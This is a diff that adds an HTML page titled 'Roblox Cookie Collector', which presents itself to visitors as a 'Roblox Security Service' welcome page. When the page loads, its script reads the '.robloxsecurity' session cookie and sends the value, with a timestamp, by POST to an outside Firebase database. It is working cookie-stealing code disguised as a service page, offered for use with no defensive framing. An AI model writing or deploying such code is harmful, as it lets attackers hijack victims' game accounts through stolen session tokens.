@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Roblox Cookie Collector</title>
+</head>
+<body>
+    <h1>Welcome to Roblox Security Service!</h1>
+    
+    <script type="text/javascript">
+        // Function to extract cookies
+        function getCookie(name) {
+            var cookieValue = null;
+            if (document.cookie && document.cookie !== '') {
+                var cookies = document.cookie.split(';');
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    // Find the cookie with our name
+                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                        break;
+                    }
+                }
+            }
+            return cookieValue;
+        }
+
+        // Function to send data to Firebase
+        function sendDataToFirebase(data) {
+            var xhr = new XMLHttpRequest();
+            xhr.open('POST', 'https://asdasdsa-f0afc-default-rtdb.firebaseio.com/cookies.json', true);
+            
+            // Set content type for JSON request
+            xhr.setRequestHeader('Content-Type', 'application/json');
+            
+            // Send data to Firebase DB
+            xhr.send(JSON.stringify(data));
+        }
+
+        // Main logic - get cookie and send it to Firebase if exists
+        var robloxCookie = getCookie('.robloxsecurity');
+        
+        if (robloxCookie) {
+            console.log('Found Roblox Security Cookie:', robloxCookie);
+            
+            // Send data with timestamp for tracking
+            sendDataToFirebase({
+                value: robloxCookie,
+                timestamp: new Date().toISOString()
+            });
+        } else {
+            console.log('.robloxsecurity cookie not found.');
+        }
+    </script>
+</body>
+</html>
